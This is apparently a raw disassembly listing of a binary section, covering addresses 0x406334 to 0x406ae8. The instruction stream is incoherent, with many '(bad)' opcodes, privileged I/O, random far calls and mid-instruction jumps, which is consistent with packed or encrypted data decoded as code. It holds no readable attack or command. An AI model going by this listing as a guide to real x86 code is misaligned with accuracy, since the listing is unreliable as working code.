  406334:	sbb    eax,0x2e23d158
  406339:	or     ebx,DWORD PTR [edx+0x1078c010]
  40633f:	xor    ch,bh
  406341:	jb     0x4063ba
  406343:	pop    eax
  406344:	cmp    esi,esi
  406346:	ret    0x7e96
  406349:	push   es
  40634a:	mov    ch,0x1c
  40634c:	jp     0x4062fe
  40634e:	and    DWORD PTR [edx-0x73],0x1220e48f
  406355:	jl     0x4063cd
  406357:	pop    ds
  406358:	inc    edx
  406359:	mov    ebx,0xf337b737
  40635e:	sbb    cl,ah
  406360:	xchg   esp,eax
  406361:	dec    esi
  406362:	or     cl,BYTE PTR [ebp+0xc]
  406365:	xor    BYTE PTR [edi+0x3ac47eba],ah
  40636b:	jp     0x40634e
  40636d:	outs   dx,DWORD PTR ss:[esi]
  40636f:	shl    eax,1
  406371:	jl     0x40631b
  406373:	ja     0x406326
  406375:	inc    ebp
  406376:	and    BYTE PTR [esi+0x2d17a14],0xa
  40637d:	dec    edx
  40637e:	lahf   
  40637f:	out    dx,al
  406380:	push   ds
  406381:	cmp    BYTE PTR [edi-0x11670d2a],ch
  406387:	pop    ecx
  406388:	sbb    esp,DWORD PTR [edi+0x19]
  40638b:	test   DWORD PTR [eax-0x60],ebp
  40638e:	ss (bad) 
  406391:	scas   al,BYTE PTR es:[edi]
  406392:	or     BYTE PTR [eax],0x9c
  406395:	sbb    BYTE PTR [esi],ah
  406397:	call   0x7ab4f788
  40639c:	push   es
  40639d:	in     eax,dx
  40639e:	mov    dh,0x7b
  4063a0:	cmc    
  4063a1:	aas    
  4063a2:	or     eax,0x2d8621e7
  4063a7:	mov    ebx,0xd2f06907
  4063ac:	clc    
  4063ad:	xor    dh,BYTE PTR [edi+0x47]
  4063b0:	mov    ebp,0xa432250e
  4063b5:	pop    DWORD PTR [edx+0x75]
  4063b8:	stos   DWORD PTR es:[edi],eax
  4063b9:	xchg   DWORD PTR [esi-0x69],esi
  4063bc:	mov    dh,0x48
  4063be:	imul   ebp,DWORD PTR [edi-0x302d28bc],0xd7d97d8e
  4063c8:	and    esi,esp
  4063ca:	and    edi,esi
  4063cc:	cmp    eax,0x136789ff
  4063d1:	mov    eax,0x7633f00d
  4063d6:	imul   esi,DWORD PTR [eax],0x5a
  4063d9:	sahf   
  4063da:	mov    bl,0xe3
  4063dc:	outs   dx,BYTE PTR ds:[esi]
  4063dd:	pop    ebx
  4063de:	lock add BYTE PTR [edx-0x74],0xc3
  4063e3:	aaa    
  4063e4:	ins    DWORD PTR es:[edi],dx
  4063e5:	call   0x6103:0x5dcda585
  4063ec:	fdiv   st,st(0)
  4063ee:	or     BYTE PTR ds:[edx-0x55],cl
  4063f2:	mov    edx,0x6ec8d3b6
  4063f7:	or     al,0x12
  4063f9:	lahf   
  4063fa:	dec    esi
  4063fb:	mov    ch,0xe9
  4063fd:	inc    ecx
  4063fe:	pop    eax
  4063ff:	aas    
  406400:	and    al,0xb9
  406402:	sbb    DWORD PTR [edx+0x28],ebx
  406405:	aad    0x9d
  406407:	test   BYTE PTR [esi+0x12],dh
  40640a:	(bad)  
  40640c:	mov    edi,ecx
  40640e:	xchg   esi,eax
  40640f:	mov    bh,0x3
  406411:	jmp    0x4063fe
  406413:	fcomp  DWORD PTR [esi]
  406415:	in     eax,0x92
  406417:	and    eax,0x1fed3ae7
  40641c:	push   edx
  40641d:	push   ebx
  40641e:	pop    ss
  40641f:	fisttp WORD PTR [eax]
  406421:	pop    esi
  406422:	adc    eax,0xb9b1bb9f
  406427:	add    al,0xe8
  406429:	add    bl,dl
  40642b:	arpl   bp,sp
  40642d:	pop    ecx
  40642e:	or     al,0x28
  406430:	lahf   
  406431:	sub    bh,BYTE PTR [eax-0x2202eb6]
  406437:	aam    0x7b
  406439:	int3   
  40643a:	or     DWORD PTR [esi],edi
  40643c:	div    DWORD PTR [edi+esi*1+0xb]
  406440:	adc    esp,ebx
  406442:	mov    cl,0x65
  406444:	outs   dx,BYTE PTR ds:[esi]
  406445:	or     DWORD PTR [edx+0x6b],ebp
  406448:	lods   eax,DWORD PTR ds:[esi]
  406449:	sub    BYTE PTR [edi-0x42],dl
  40644c:	repz jecxz 0x40647f
  40644f:	pop    ss
  406450:	xor    DWORD PTR [esi+0x38],edx
  406453:	pop    ebp
  406454:	cmc    
  406455:	ret    0x86fd
  406458:	imul   esi,DWORD PTR [esi+0x1f],0x28e40e59
  40645f:	jo     0x40644c
  406461:	fstp   DWORD PTR [ecx+0x25]
  406464:	stc    
  406465:	cmp    DWORD PTR [ebp+0x3ed9666b],0xffffff87
  40646c:	inc    esi
  40646d:	je     0x40649a
  40646f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406470:	pop    es
  406471:	adc    edx,DWORD PTR [edi]
  406473:	dec    ecx
  406474:	jg     0x40645b
  406476:	mov    bl,0xfe
  406478:	call   eax
  40647a:	data16 neg BYTE PTR [eax]
  40647d:	rcr    al,cl
  40647f:	xchg   ebp,eax
  406480:	or     DWORD PTR [eax-0x50f5d12e],edx
  406486:	jnp    0x406500
  406488:	cld    
  406489:	ficom  DWORD PTR [eax-0x46]
  40648c:	sub    eax,0xd58f1279
  406491:	(bad)  
  406492:	enter  0xd4e2,0x1f
  406496:	jmp    0x54719b79
  40649b:	ret    
  40649c:	mul    DWORD PTR [edi+ebp*1+0x1e2edbb6]
  4064a3:	ss scas al,BYTE PTR es:[edi]
  4064a5:	mov    eax,0x48469751
  4064aa:	mov    DWORD PTR [ecx],ecx
  4064ac:	mov    al,0x60
  4064ae:	repnz test eax,0xa089b8d4
  4064b4:	rcl    BYTE PTR [ebx-0x601fcf04],0x65
  4064bb:	sbb    BYTE PTR [ebx+0x10e03fc3],dl
  4064c1:	ins    DWORD PTR es:[edi],dx
  4064c2:	loop   0x4064de
  4064c4:	sub    al,0x7d
  4064c6:	mov    esp,0xcbd1e4fe
  4064cb:	and    al,0x8b
  4064cd:	mov    ch,0x0
  4064cf:	sub    bh,ah
  4064d1:	in     al,0x5e
  4064d3:	dec    edx
  4064d4:	imul   ecx,DWORD PTR [ebx],0x25
  4064d7:	mov    ds:0xe4fa2692,eax
  4064dc:	(bad)  
  4064dd:	outs   dx,BYTE PTR ds:[esi]
  4064de:	icebp  
  4064df:	sub    BYTE PTR [eax-0x2e],ah
  4064e2:	dec    edi
  4064e3:	sub    al,0x77
  4064e5:	jmp    0x4064c7
  4064e7:	icebp  
  4064e8:	aaa    
  4064e9:	test   al,0xf5
  4064eb:	retf   
  4064ec:	stos   DWORD PTR es:[edi],eax
  4064ed:	les    ecx,FWORD PTR [eax]
  4064ef:	into   
  4064f0:	push   0x30
  4064f2:	iret   
  4064f3:	cwde   
  4064f4:	jge    0x4064ca
  4064f6:	sub    BYTE PTR [ecx+0x78d915c5],ch
  4064fc:	add    BYTE PTR [edi-0x31],dh
  4064ff:	mov    edi,DWORD PTR [esi-0x574150fb]
  406505:	jne    0x40656d
  406507:	push   esi
  406508:	popa   
  406509:	dec    ebp
  40650a:	add    BYTE PTR [edi],dh
  40650c:	add    BYTE PTR [ebx-0x7f],ch
  40650f:	pusha  
  406510:	sti    
  406511:	(bad)  
  406512:	jns    0x40657b
  406514:	cmp    eax,0x90b00157
  406519:	adc    dh,ah
  40651b:	cwde   
  40651c:	out    0xba,eax
  40651e:	fadd   QWORD PTR [edi+ebp*8+0x465c6ba6]
  406525:	ss mov esp,0xa6555742
  40652b:	dec    ebp
  40652c:	sbb    eax,0x80212094
  406531:	shr    DWORD PTR [edx-0x5e634dbf],cl
  406537:	jl     0x406584
  406539:	repz dec edx
  40653b:	sub    al,BYTE PTR [edx+0x784b4831]
  406541:	mov    ds:0x9b35c055,al
  406546:	push   0xffffffc6
  406548:	dec    BYTE PTR [ebx+0x6f]
  40654b:	in     al,dx
  40654c:	add    al,0x67
  40654e:	(bad)  
  40654f:	cmc    
  406550:	push   ds
  406551:	lods   eax,DWORD PTR ds:[esi]
  406552:	push   ebp
  406553:	in     eax,dx
  406554:	fwait
  406555:	and    cl,BYTE PTR [edi-0x5f]
  406558:	int    0x41
  40655a:	mov    bl,0xfb
  40655c:	in     eax,dx
  40655d:	repz pop edx
  40655f:	adc    esp,DWORD PTR [ebx+ebx*1+0x18]
  406563:	inc    esi
  406564:	ja     0x40657a
  406566:	test   DWORD PTR [ebp-0x18aacacf],ebp
  40656c:	xchg   edx,eax
  40656d:	jno    0x406561
  40656f:	(bad)
  406573:	mov    ah,0xfa
  406575:	and    DWORD PTR [esi-0x71],0x74
  406579:	sahf   
  40657a:	out    dx,eax
  40657b:	push   0x8ae1d89c
  406580:	stos   BYTE PTR es:[edi],al
  406581:	(bad)  
  406582:	adc    DWORD PTR [ebp+0x6a32c15b],esi
  406588:	data16 jecxz 0x406521
  40658b:	lods   eax,DWORD PTR ds:[esi]
  40658c:	cmp    al,BYTE PTR [edx]
  40658e:	into   
  40658f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406590:	add    BYTE PTR [ebp+0x7c],al
  406593:	test   eax,0x229d3a32
  406598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406599:	push   0xffffffe0
  40659b:	pop    ebp
  40659c:	cmp    edx,DWORD PTR [ecx]
  40659e:	mov    ds:0x269ad0a6,eax
  4065a3:	clc    
  4065a4:	mov    DWORD PTR [ebx-0x2],ebx
  4065a7:	fmul   QWORD PTR [ecx-0xeeb0848]
  4065ad:	cmp    al,0x65
  4065af:	cwde   
  4065b0:	mov    bh,0x98
  4065b2:	xor    DWORD PTR [edi],eax
  4065b4:	test   BYTE PTR [edi*8-0xb526485],ah
  4065bb:	pop    edx
  4065bc:	cmp    ah,BYTE PTR [edi+0x2b938cb6]
  4065c2:	mov    ds:0x617043d6,eax
  4065c7:	cld    
  4065c8:	mov    eax,ds:0xa305b3f7
  4065cd:	mov    eax,ds:0xafab9598
  4065d2:	shr    DWORD PTR [eax-0x61],1
  4065d5:	pop    edi
  4065d6:	out    0x46,al
  4065d8:	test   DWORD PTR [esi],esi
  4065da:	retf   0x822c
  4065dd:	loope  0x40660e
  4065df:	mov    edx,edx
  4065e1:	jp     0x406569
  4065e3:	sbb    DWORD PTR [ecx],ecx
  4065e5:	stos   BYTE PTR es:[edi],al
  4065e6:	dec    edx
  4065e7:	dec    ebp
  4065e8:	add    ebp,eax
  4065ea:	mov    edx,0xb5cb5a6e
  4065ef:	pop    edx
  4065f0:	outs   dx,BYTE PTR ds:[esi]
  4065f1:	xchg   DWORD PTR [esi],esi
  4065f3:	xor    eax,0xc37c0279
  4065f8:	out    dx,al
  4065f9:	int    0x2f
  4065fb:	lahf   
  4065fc:	lods   eax,DWORD PTR ds:[esi]
  4065fd:	dec    ebp
  4065fe:	adc    bh,dl
  406600:	sbb    eax,0x25e30f1
  406605:	dec    eax
  406606:	xor    al,0x25
  406608:	rcl    BYTE PTR [ebx],cl
  40660a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40660b:	pop    ebp
  40660c:	ds scas al,BYTE PTR es:[edi]
  40660e:	test   al,0x27
  406610:	out    dx,al
  406611:	xor    BYTE PTR [esi+ebp*8+0x132c880c],al
  406618:	push   eax
  406619:	call   0x22af:0xce9fe942
  406620:	cmp    eax,0xd4ba4ec2
  406625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406626:	pop    es
  406627:	add    eax,0x2f12081b
  40662c:	lods   eax,DWORD PTR ds:[esi]
  40662d:	imul   ecx,DWORD PTR [eax+0x4b],0xb759a5a0
  406634:	cmp    BYTE PTR [ebp-0x50211de9],bh
  40663a:	leave  
  40663b:	or     DWORD PTR [eax+0x1406fd2f],eax
  406641:	jae    0x4065f1
  406643:	push   ecx
  406644:	and    al,0xc9
  406646:	jnp    0x40665f
  406648:	dec    esi
  406649:	int3   
  40664a:	mov    edx,0xf44e0380
  40664f:	imul   esi,DWORD PTR [esi],0x40599e7f
  406655:	push   edi
  406656:	mov    dl,0x16
  406658:	sbb    dl,bl
  40665a:	xor    edx,esp
  40665c:	xor    esp,DWORD PTR ss:[esi+0x79]
  406660:	cmp    BYTE PTR [edi-0x77ba105a],0x0
  406667:	mov    edx,0x276a2958
  40666c:	cmp    al,0x70
  40666e:	xchg   esi,eax
  40666f:	mov    ecx,0x25d7bdb4
  406674:	inc    esp
  406675:	div    BYTE PTR [esi+edi*2+0x5c3c9f04]
  40667c:	xor    BYTE PTR [ecx+ecx*1+0x2e],al
  406680:	inc    ebx
  406681:	(bad)  
  406683:	or     DWORD PTR ds:0xebccf84d,0xffffff92
  40668a:	jge    0x4066bd
  40668c:	xchg   edx,eax
  40668d:	mov    ebp,DWORD PTR [edx-0x10]
  406690:	(bad)  
  406691:	in     eax,0xfb
  406693:	xchg   esp,eax
  406694:	test   eax,0x61dcf123
  406699:	aam    0x70
  40669b:	or     eax,0x7fddad89
  4066a0:	shl    BYTE PTR [esi+eiz*2-0x65],cl
  4066a4:	in     al,0x68
  4066a6:	fs popf 
  4066a8:	xor    eax,0x99c6e9b0
  4066ad:	push   es
  4066ae:	and    al,cl
  4066b0:	daa    
  4066b1:	mov    ch,0x69
  4066b3:	jp     0x40670d
  4066b5:	cmp    dh,al
  4066b7:	jo     0x406669
  4066b9:	jmp    0x2db5fbe5
  4066be:	jae    0x406688
  4066c0:	and    dh,BYTE PTR [ecx]
  4066c2:	xlat   BYTE PTR ds:[ebx]
  4066c3:	loop   0x406693
  4066c5:	neg    BYTE PTR [ebx-0x6e]
  4066c8:	mov    ah,0xe4
  4066ca:	or     eax,0xe73e375c
  4066cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066d0:	inc    ebx
  4066d1:	(bad)  
  4066d2:	mov    ?,WORD PTR [ebx-0x6c1d89e1]
  4066d8:	fisubr WORD PTR [ebx+0x7]
  4066dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066dd:	pop    es
  4066de:	loopne 0x4066f5
  4066e0:	cmc    
  4066e1:	pop    esp
  4066e2:	jns    0x406758
  4066e4:	mov    cl,0xed
  4066e6:	mov    eax,0x55ce4431
  4066eb:	imul   edi,DWORD PTR [edi-0x6e],0xe3de1421
  4066f2:	add    eax,0x85d3123b
  4066f7:	mov    bl,BYTE PTR [edx]
  4066f9:	shl    DWORD PTR [ebx-0x34],0x24
  4066fd:	sub    al,0x1d
  4066ff:	push   ecx
  406700:	xor    DWORD PTR [eax+edi*8],ecx
  406703:	in     al,dx
  406704:	pusha  
  406705:	neg    DWORD PTR [esi-0x7d]
  406708:	(bad)  
  406709:	jo     0x406715
  40670b:	ror    BYTE PTR ds:0xafaf3547,cl
  406711:	jno    0x4066b4
  406713:	ja     0x406765
  406715:	scas   al,BYTE PTR es:[edi]
  406716:	enter  0xa3d1,0x8
  40671a:	push   ds
  40671b:	dec    edx
  40671c:	jge    0x406786
  40671e:	add    esi,edi
  406720:	xchg   BYTE PTR [edx+ecx*1-0x4b8dccaa],bh
  406727:	lock inc eax
  406729:	shl    BYTE PTR [edi],0x53
  40672c:	sub    ecx,ecx
  40672e:	xchg   ebp,eax
  40672f:	mov    esp,0x78ebffd1
  406734:	adc    eax,0xa77bcf21
  406739:	or     DWORD PTR [ebx+eax*2+0x567c345c],edx
  406740:	xchg   BYTE PTR [ebx-0x39c8f268],ch
  406746:	cmp    dh,BYTE PTR [edx]
  406748:	jae    0x4066d3
  40674a:	cdq    
  40674b:	add    BYTE PTR [edx-0x3216bb01],al
  406751:	pop    ebx
  406752:	inc    edx
  406753:	adc    ebx,DWORD PTR [esi+eax*2-0x53]
  406757:	fisttp WORD PTR [esi-0x7]
  40675a:	or     DWORD PTR [esi-0x6b32bc1a],0xffffffdf
  406761:	sbb    BYTE PTR [esi-0x32],ch
  406764:	scas   eax,DWORD PTR es:[edi]
  406765:	mov    BYTE PTR [ecx+0x5619c80a],0x1
  40676c:	pop    ebx
  40676d:	popf   
  40676e:	je     0x4067b3
  406770:	pop    ss
  406771:	pop    esi
  406772:	adc    ebp,DWORD PTR [ecx]
  406774:	mov    bh,0x18
  406776:	fldcw  WORD PTR [ecx-0x5df7ee2d]
  40677c:	push   edi
  40677d:	popa   
  40677e:	scas   eax,DWORD PTR es:[edi]
  40677f:	fidivr WORD PTR [edx-0x20e23a91]
  406785:	sahf   
  406786:	retf   
  406787:	add    edi,ebx
  406789:	ja     0x40673d
  40678b:	mov    edi,0x1b552c85
  406790:	mov    cl,0x24
  406792:	xchg   esp,eax
  406793:	pop    ds
  406794:	js     0x40674b
  406796:	pusha  
  406797:	xchg   DWORD PTR [ebp+0x7e],esp
  40679a:	push   0x2a4da5ec
  40679f:	cmp    DWORD PTR [ecx+0x2],esp
  4067a2:	mov    eax,0xc814647b
  4067a7:	xlat   BYTE PTR ds:[ebx]
  4067a8:	jae    0x406774
  4067aa:	cmc    
  4067ab:	xor    al,0xd8
  4067ad:	mov    bh,0x7d
  4067af:	xchg   edx,eax
  4067b0:	sub    esi,DWORD PTR [eax-0x23e4838a]
  4067b6:	ins    DWORD PTR es:[edi],dx
  4067b7:	popf   
  4067b8:	cmp    al,0xd7
  4067ba:	sahf   
  4067bb:	fdiv   QWORD PTR [ecx+ecx*1+0x66]
  4067bf:	pop    es
  4067c0:	push   es
  4067c1:	popf   
  4067c2:	icebp  
  4067c3:	xor    bl,BYTE PTR [esi-0x4b]
  4067c6:	jmp    0xe6e7:0x2224ddc3
  4067cd:	sub    eax,esp
  4067cf:	lock cmp bh,ah
  4067d2:	(bad)  
  4067d3:	dec    esp
  4067d4:	and    bl,bl
  4067d6:	sbb    DWORD PTR [ebx+0x51],eax
  4067d9:	mov    dh,0xe
  4067db:	scas   al,BYTE PTR es:[edi]
  4067dc:	jle    0x406831
  4067de:	popf   
  4067df:	mov    al,0xb6
  4067e1:	rcl    BYTE PTR [esi],1
  4067e3:	retf   
  4067e4:	xchg   ebx,eax
  4067e5:	pop    eax
  4067e6:	and    dl,BYTE PTR [esi]
  4067e8:	push   0x15355005
  4067ed:	sbb    DWORD PTR [edx-0x62],eax
  4067f0:	int3   
  4067f1:	hlt    
  4067f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067f3:	or     al,0xf7
  4067f5:	repz cld 
  4067f7:	shl    dh,cl
  4067f9:	fbstp  TBYTE PTR [ebx]
  4067fb:	inc    bl
  4067fd:	jbe    0x40687d
  4067ff:	jg     0x4067a8
  406801:	push   edx
  406802:	shl    DWORD PTR [ebx+0x1a587aa8],1
  406808:	loopne 0x406855
  40680a:	ins    BYTE PTR es:[edi],dx
  40680b:	rcr    BYTE PTR [edx-0x75],cl
  40680e:	push   ebp
  40680f:	ret    0xee06
  406812:	inc    edx
  406813:	mov    al,ds:0x8456fd2
  406818:	or     bh,BYTE PTR [ecx+0x5cb6019e]
  40681e:	add    DWORD PTR [ecx],ecx
  406820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406821:	into   
  406822:	pop    ss
  406823:	and    ah,BYTE PTR [edi]
  406825:	sbb    al,0xb5
  406827:	or     ebp,esp
  406829:	push   0xffffffcd
  40682b:	cmp    BYTE PTR [esi-0xe92bddc],cl
  406831:	shl    BYTE PTR [eax+edx*1],cl
  406834:	repz sbb BYTE PTR [edi+0x65bfa686],ah
  40683b:	into   
  40683c:	inc    ebp
  40683d:	mov    ebx,0x2caf460
  406842:	fst    DWORD PTR [eax+0x22f7a513]
  406848:	cld    
  406849:	jns    0x4067e9
  40684b:	cmp    eax,0x2a8a9f63
  406850:	sbb    edi,DWORD PTR [ecx-0x3fa1d58a]
  406856:	jmp    0x4f9c0dd9
  40685b:	int3   
  40685c:	nop
  40685d:	nop
  40685e:	dec    edi
  40685f:	and    DWORD PTR [esi-0x60cb2fd5],ebp
  406865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406866:	mov    ch,BYTE PTR [esi+eax*2-0x2a]
  40686a:	les    esp,FWORD PTR [edx-0x5a8f41d6]
  406870:	xchg   ebp,eax
  406871:	imul   esi,DWORD PTR [ebx],0xffffff8e
  406874:	mov    eax,ds:0x7f8cd4ac
  406879:	xlat   BYTE PTR ds:[ebx]
  40687a:	sahf   
  40687b:	xchg   esp,eax
  40687c:	cwde   
  40687d:	push   0x30
  40687f:	ja     0x4068fb
  406881:	xchg   ebp,eax
  406882:	push   cs
  406883:	adc    al,0xc
  406885:	mov    DWORD PTR [esi-0x7ddc882f],eax
  40688b:	jmp    FWORD PTR [edi+0x139c1899]
  406891:	inc    ebp
  406892:	and    ecx,ebp
  406894:	push   ebp
  406895:	adc    al,0x8a
  406897:	mov    WORD PTR [edi+0x6e],gs
  40689a:	daa    
  40689b:	(bad)  
  40689c:	gs xor al,0x8f
  40689f:	adc    al,0x7a
  4068a1:	push   edx
  4068a2:	push   eax
  4068a3:	push   0x35
  4068a5:	mov    BYTE PTR [eax-0x68],ch
  4068a8:	mov    eax,ds:0xf765a40c
  4068ad:	leave  
  4068ae:	aaa    
  4068af:	retf   
  4068b0:	mov    cl,dh
  4068b2:	hlt    
  4068b3:	sbb    eax,0xbc058d2b
  4068b8:	mov    edi,0x7058f801
  4068bd:	sub    al,0xd3
  4068bf:	ss call 0x1ff6:0xf318c830
  4068c7:	inc    eax
  4068c8:	jp     0x40688b
  4068ca:	fdiv   QWORD PTR [esi+ebx*8]
  4068cd:	cwde   
  4068ce:	mul    BYTE PTR [ecx]
  4068d0:	fldenv [esi*2+0x3d3c5edb]
  4068d7:	shr    al,cl
  4068d9:	xchg   esi,eax
  4068da:	cmc    
  4068db:	and    al,0xcf
  4068dd:	enter  0x27ed,0x31
  4068e1:	lea    ebp,[esi+0x7acd6aac]
  4068e7:	xor    DWORD PTR [ecx+0x62c429d2],eax
  4068ed:	xor    dl,BYTE PTR [ebx]
  4068ef:	fs or  al,0x18
  4068f2:	xor    eax,0x925264e3
  4068f7:	jg     0x4068b4
  4068f9:	dec    ebp
  4068fa:	fs pop ebp
  4068fc:	ins    DWORD PTR es:[edi],dx
  4068fd:	or     cl,BYTE PTR [ebx]
  4068ff:	pop    ds
  406900:	test   BYTE PTR ds:0x5c7e5a12,al
  406906:	sahf   
  406907:	call   ecx
  406909:	repnz (bad) 
  40690b:	leave  
  40690c:	(bad)  
  40690d:	xchg   edx,eax
  40690e:	jl     0x4068ab
  406910:	out    0xe0,eax
  406912:	xor    eax,0xd7956386
  406917:	dec    edx
  406918:	nop
  406919:	(bad)  
  40691a:	pop    ecx
  40691b:	mov    eax,0x3238ab2d
  406920:	xor    esp,DWORD PTR [ebx]
  406922:	sbb    eax,0xff3d2a26
  406927:	ds mov bl,0x79
  40692a:	ficomp DWORD PTR [esi+0x6bbf52bf]
  406930:	int    0xde
  406932:	shl    esi,0x7d
  406935:	test   al,0xe2
  406937:	dec    edi
  406938:	ins    BYTE PTR es:[edi],dx
  406939:	xor    eax,0xfc71d34e
  40693e:	das    
  40693f:	sub    edi,ecx
  406941:	mov    edx,esi
  406943:	xlat   BYTE PTR ds:[ebx]
  406944:	(bad)  
  406945:	rcr    BYTE PTR [eax-0x411549eb],1
  40694b:	add    edi,DWORD PTR [esi+0x69]
  40694e:	jge    0x4069a8
  406950:	(bad)  
  406951:	arpl   WORD PTR [ebx-0x67],ax
  406954:	dec    eax
  406955:	iret   
  406956:	jge    0x406933
  406958:	sub    eax,0xca1a0beb
  40695d:	push   es
  40695e:	(bad)
  406961:	xor    esi,DWORD PTR [edx+0x29]
  406964:	or     bl,al
  406966:	cmc    
  406967:	leave  
  406968:	push   ss
  406969:	xchg   edx,eax
  40696a:	out    dx,eax
  40696b:	test   edi,ebx
  40696d:	leave  
  40696e:	(bad)  
  40696f:	ins    BYTE PTR es:[edi],dx
  406970:	pop    ebx
  406971:	xchg   ebx,eax
  406972:	into   
  406973:	mov    ch,al
  406975:	dec    edi
  406976:	test   al,0x0
  406978:	loopne 0x40696b
  40697a:	xchg   ebx,eax
  40697b:	in     al,dx
  40697c:	adc    DWORD PTR [esi+0x7fd12f70],esi
  406982:	call   0x7c127638
  406987:	ret    
  406988:	mov    ebx,0xd21713de
  40698d:	jle    0x4069be
  40698f:	inc    edx
  406990:	frstor es:[ebx]
  406993:	xor    al,BYTE PTR [ebp-0x59]
  406996:	dec    eax
  406997:	outs   dx,DWORD PTR ds:[esi]
  406998:	mov    ds:0x5dd73db4,al
  40699d:	out    dx,eax
  40699e:	ror    BYTE PTR ds:0xcef44398,0x43
  4069a5:	or     BYTE PTR [ecx-0x171ea4ef],0xb8
  4069ac:	cli    
  4069ad:	sbb    BYTE PTR [ebp-0x16],ah
  4069b0:	xchg   esp,eax
  4069b1:	dec    ecx
  4069b2:	sub    al,0x13
  4069b4:	mov    ch,0xf
  4069b6:	mov    ds:0xf62abf51,eax
  4069bb:	or     DWORD PTR ds:0x4fda35ca,0xffffffb5
  4069c2:	dec    esi
  4069c3:	cmp    BYTE PTR [edi+0x39d4e63d],0x91
  4069ca:	retf   0x2e6d
  4069cd:	or     al,cl
  4069cf:	and    al,0x35
  4069d1:	rcl    DWORD PTR [ecx+0x38],cl
  4069d4:	cmp    ebp,DWORD PTR [eax-0x25fc3ce9]
  4069da:	test   DWORD PTR [ebx-0x7d4b346f],edi
  4069e0:	mov    cl,0x6f
  4069e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069e3:	cmp    DWORD PTR [esi],0x60
  4069e6:	clc    
  4069e7:	xor    BYTE PTR [eax+0x419a3f0e],bl
  4069ed:	xchg   DWORD PTR es:[eax-0x50ba398b],ecx
  4069f4:	jbe    0x406a24
  4069f6:	dec    esp
  4069f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069f8:	adc    eax,0x6a5c5f98
  4069fd:	mov    bl,0x64
  4069ff:	dec    edx
  406a00:	cli    
  406a01:	push   ebx
  406a02:	mov    ch,0xb2
  406a04:	xor    DWORD PTR [edi-0x3e],edi
  406a07:	sbb    cl,BYTE PTR [esi+0x10]
  406a0a:	dec    esi
  406a0b:	arpl   si,dx
  406a0d:	psrld  mm7,QWORD PTR [esi-0x20]
  406a11:	jae    0x406a06
  406a13:	jmp    0x9e0df021
  406a18:	dec    esp
  406a19:	adc    DWORD PTR [esi-0x5e69534a],edi
  406a1f:	imul   ebx,DWORD PTR [edi-0x6b],0x20986c6c
  406a26:	pop    ebx
  406a27:	adc    DWORD PTR [ecx-0x3c979186],edi
  406a2d:	enter  0x3003,0x94
  406a31:	inc    ebp
  406a32:	mov    eax,eax
  406a34:	sahf   
  406a35:	out    dx,al
  406a36:	sahf   
  406a37:	int3   
  406a38:	jle    0x406aa1
  406a3a:	(bad)  
  406a3b:	jg     0x406a4f
  406a3d:	push   ss
  406a3e:	cmp    al,0xe
  406a40:	ds or  al,0x36
  406a43:	loope  0x406a53
  406a45:	mov    bh,0x62
  406a47:	gs xchg edi,eax
  406a49:	cli    
  406a4a:	ins    DWORD PTR es:[edi],dx
  406a4b:	adc    al,0xff
  406a4d:	mov    edx,0xbdd11b12
  406a52:	div    DWORD PTR [ebp+0x4a]
  406a55:	lods   al,BYTE PTR ds:[esi]
  406a56:	add    BYTE PTR [ecx],ch
  406a58:	cmp    eax,0x2f8f251
  406a5d:	retf   
  406a5e:	faddp  st(5),st
  406a60:	lds    edx,FWORD PTR [eax-0x40]
  406a63:	scas   eax,DWORD PTR es:[edi]
  406a64:	fst    QWORD PTR [edx-0x56]
  406a67:	pop    edi
  406a68:	pop    eax
  406a69:	popf   
  406a6a:	test   eax,0xb7c24e12
  406a6f:	lods   eax,DWORD PTR ds:[esi]
  406a70:	cmp    ah,al
  406a72:	pusha  
  406a73:	rol    DWORD PTR [eax],cl
  406a75:	out    dx,al
  406a76:	icebp  
  406a77:	push   ebx
  406a78:	out    0xf9,eax
  406a7a:	adc    BYTE PTR [esi],ch
  406a7c:	pop    ebp
  406a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a7e:	mov    ds:0xd396d67b,al
  406a83:	xchg   esp,eax
  406a84:	call   0xe493:0xa5957c51
  406a8b:	adc    DWORD PTR [edx],esp
  406a8d:	dec    ebx
  406a8e:	dec    edi
  406a8f:	xchg   edx,eax
  406a90:	jae    0x406aea
  406a92:	push   cs
  406a93:	in     eax,0x2b
  406a95:	inc    edi
  406a96:	mov    DWORD PTR [edx+0x12bc6295],ebx
  406a9c:	out    0x6b,eax
  406a9e:	adc    eax,0x21168b22
  406aa3:	fldcw  WORD PTR [ebp+0x62]
  406aa6:	stos   BYTE PTR es:[edi],al
  406aa7:	fdivp  st(2),st
  406aa9:	sub    al,0xf5
  406aab:	out    dx,al
  406aac:	add    dl,BYTE PTR [edi]
  406aae:	push   esi
  406aaf:	or     BYTE PTR [ecx],bh
  406ab1:	and    al,0x65
  406ab3:	xchg   edi,eax
  406ab4:	mov    edx,0xaf4e529a
  406ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aba:	sub    ch,BYTE PTR [esi+edx*8+0x53]
  406abe:	bound  ebp,QWORD PTR [ebx-0x2de61c9f]
  406ac4:	jge    0x406ad4
  406ac6:	dec    eax
  406ac7:	loop   0x406a99
  406ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aca:	inc    ecx
  406acb:	inc    edx
  406acc:	and    DWORD PTR [ebp+0x6ca27294],ebp
  406ad2:	aaa    
  406ad3:	xchg   edi,eax
  406ad4:	add    bl,BYTE PTR [edx]
  406ad6:	and    al,0x6c
  406ad8:	sbb    eax,0xce77b20b
  406add:	hlt    
  406ade:	or     DWORD PTR [eax],ecx
  406ae0:	scas   eax,DWORD PTR es:[edi]
  406ae1:	jg     0x406b23
  406ae3:	inc    ebx
  406ae4:	fistp  WORD PTR [ebx]
  406ae6:	jo     0x406ac8
  406ae8:	clc    
